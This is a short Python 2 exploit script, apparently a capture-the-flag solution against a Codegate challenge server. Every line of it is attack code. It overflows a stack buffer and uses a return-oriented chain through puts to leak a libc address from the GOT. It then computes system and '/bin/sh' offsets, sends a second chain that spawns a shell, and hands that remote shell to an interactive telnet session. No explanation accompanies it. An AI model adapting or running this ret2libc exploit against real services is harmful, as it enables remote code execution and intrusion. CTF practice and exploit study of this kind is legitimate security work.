#!/usr/bin/python
import struct
import socket
import telnetlib

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

def readuntil(f, delim='> '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

bss_addr = 0x602800
s.connect(('ch41l3ng3s.codegate.kr', 3131))
f = s.makefile('rw', bufsize=0)

strtoul_got = 0x602068
puts = 0x4006c0
pop_rdi_ret = 0x400bc3
pop_rsi_r15_ret = 0x400bc1
main = 0x400A4B

readuntil(f, '(1-3)\n')
payload = 'A' * 0xb8
payload += p(pop_rdi_ret)
payload += p(strtoul_got)
payload += p(puts)
payload += p(main)
f.write(payload)

readuntil(f, ':( \n')
strtoul = u(f.read(6) + '\0\0')
libc_base = strtoul - 0x3b3f0
print 'libc_base =', hex(libc_base)
system = libc_base + 0x45390
binsh = libc_base + 0x18cd57

readuntil(f, '(1-3)\n')
payload = 'A' * 0xb8
payload += p(pop_rdi_ret)
payload += p(binsh)
payload += p(system)
f.write(payload)

t = telnetlib.Telnet()
t.sock = s
t.interact()
